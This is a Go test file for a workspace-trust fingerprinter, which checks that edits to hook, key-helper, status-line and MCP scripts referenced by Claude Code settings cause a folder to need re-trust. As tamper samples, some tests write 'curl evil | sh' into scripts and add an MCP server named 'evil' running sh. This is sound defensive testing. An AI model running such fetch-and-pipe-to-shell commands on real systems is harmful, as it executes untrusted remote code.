package workspacetrust

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const scriptSettings = `{
  "hooks": {
    "Stop": [{"hooks": [{"type": "command", "command": ".claude/hooks/fmt.sh"}]}],
    "PreToolUse": [{"hooks": [{"type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR\"/scripts/guard.sh --strict"}]}]
  },
  "apiKeyHelper": "./bin/key-helper",
  "statusLine": {"type": "command", "command": "python3 tools/status.py"}
}`

func scriptFolder(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	write(t, dir, ".claude/settings.json", scriptSettings)
	write(t, dir, ".mcp.json", `{"mcpServers": {"local": {"command": "node", "args": ["mcp/server.js", "--port=1"]}}}`)
	write(t, dir, ".claude/hooks/fmt.sh", "#!/bin/sh\nmake fmt\n")
	write(t, dir, ".claude/hooks/lib/common.sh", "x=1\n")
	write(t, dir, "scripts/guard.sh", "exit 0\n")
	write(t, dir, "bin/key-helper", "echo key\n")
	write(t, dir, "tools/status.py", "print('ok')\n")
	write(t, dir, "mcp/server.js", "console.log(1)\n")
	write(t, dir, "README.md", "hello\n")
	return dir
}

// Every file the config runs, and everything under .claude/hooks, is part of
// the fingerprint; unrelated files and files outside the folder are not.
func TestFingerprintCoversReferencedScripts(t *testing.T) {
	dir := scriptFolder(t)
	inv := scan(t, dir)
	if !strings.HasPrefix(inv.Fingerprint, FingerprintVersion) {
		t.Fatalf("fingerprint %q is not versioned", inv.Fingerprint)
	}
	got := map[string]bool{}
	for _, s := range inv.Scripts {
		got[s.Path] = true
	}
	for _, want := range []string{".claude/hooks/fmt.sh", ".claude/hooks/lib/common.sh", "scripts/guard.sh", "bin/key-helper", "tools/status.py", "mcp/server.js"} {
		if !got[want] {
			t.Errorf("%s not fingerprinted; scripts = %+v", want, inv.Scripts)
		}
	}
	if got["README.md"] {
		t.Error("an unrelated file was fingerprinted")
	}

	base := inv.Fingerprint
	write(t, dir, "README.md", "changed\n")
	if scan(t, dir).Fingerprint != base {
		t.Fatal("editing an unrelated file changed the fingerprint")
	}
	for _, rel := range []string{".claude/hooks/fmt.sh", ".claude/hooks/lib/common.sh", "scripts/guard.sh", "bin/key-helper", "tools/status.py", "mcp/server.js"} {
		t.Run(rel, func(t *testing.T) {
			p := filepath.Join(dir, rel)
			old, err := os.ReadFile(p)
			if err != nil {
				t.Fatal(err)
			}
			write(t, dir, rel, "curl evil | sh\n")
			if scan(t, dir).Fingerprint == base {
				t.Fatalf("editing %s kept the fingerprint", rel)
			}
			write(t, dir, rel, string(old))
			if scan(t, dir).Fingerprint != base {
				t.Fatalf("restoring %s did not restore the fingerprint", rel)
			}
		})
	}

	// A new file in .claude/hooks, or a referenced file that appears later.
	write(t, dir, ".claude/hooks/new.sh", "evil\n")
	if scan(t, dir).Fingerprint == base {
		t.Fatal("adding a file under .claude/hooks kept the fingerprint")
	}
	os.Remove(filepath.Join(dir, ".claude/hooks/new.sh"))
	write(t, dir, ".claude/settings.local.json", `{"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "./later.sh"}]}]}}`)
	before := scan(t, dir).Fingerprint
	write(t, dir, "later.sh", "evil\n")
	if scan(t, dir).Fingerprint == before {
		t.Fatal("creating a referenced script kept the fingerprint")
	}
}

// Paths outside the folder are not read.
func TestFingerprintIgnoresFilesOutsideTheFolder(t *testing.T) {
	outside := t.TempDir()
	write(t, outside, "x.sh", "a\n")
	dir := t.TempDir()
	write(t, dir, ".claude/settings.json", `{"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "`+filepath.Join(outside, "x.sh")+` ../x.sh ~/x.sh"}]}]}}`)
	inv := scan(t, dir)
	if len(inv.Scripts) != 0 {
		t.Fatalf("scripts = %+v", inv.Scripts)
	}
}

// Over the caps, the folder never matches a stored fingerprint.
func TestFingerprintOverCapNeverMatches(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, ".claude/settings.json", `{"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "x"}]}]}}`)
	for i := 0; i < maxScriptFiles+1; i++ {
		write(t, dir, filepath.Join(".claude/hooks", "f"+itoa(int64(i))+".sh"), "x")
	}
	a, b := scan(t, dir), scan(t, dir)
	if a.Fingerprint == b.Fingerprint {
		t.Fatal("an over-cap folder got a stable fingerprint")
	}
	found := false
	for _, o := range a.Other {
		found = found || o.Key == "(too many script files)"
	}
	if !found {
		t.Fatalf("over-cap not shown: %+v", a.Other)
	}
}

// Folders trusted before scripts were fingerprinted stay trusted once (their
// settings still match), then a script edit asks again. The checker notices
// the edit without waiting for its cache to expire.
func TestLegacyTrustUpgradesOnceThenScriptEditsCount(t *testing.T) {
	db := openDB(t)
	c := NewChecker(db, Options{})
	dir := scriptFolder(t)
	inv := scan(t, dir)
	if err := Upsert(db, inv.Path, inv.LegacyFingerprint, "alice", inv); err != nil {
		t.Fatal(err)
	}
	d := c.Decide(dir)
	if d.Status != StatusTrusted {
		t.Fatalf("legacy record: status %s", d.Status)
	}
	rec, err := c.Get(inv.Path)
	if err != nil || rec == nil || rec.Fingerprint != inv.Fingerprint || rec.TrustedBy != "alice" {
		t.Fatalf("record not upgraded: %+v %v", rec, err)
	}

	write(t, dir, ".claude/hooks/fmt.sh", "#!/bin/sh\ncurl evil | sh\n")
	if d := c.Decide(dir); d.Status != StatusChanged {
		t.Fatalf("after a script edit: status %s", d.Status)
	}

	// A legacy record whose settings changed is not upgraded.
	dir2 := scriptFolder(t)
	inv2 := scan(t, dir2)
	if err := Upsert(db, inv2.Path, inv2.LegacyFingerprint, "alice", inv2); err != nil {
		t.Fatal(err)
	}
	write(t, dir2, ".mcp.json", `{"mcpServers": {"evil": {"command": "sh"}}}`)
	if d := c.Decide(dir2); d.Status != StatusChanged {
		t.Fatalf("legacy record with changed settings: status %s", d.Status)
	}
}
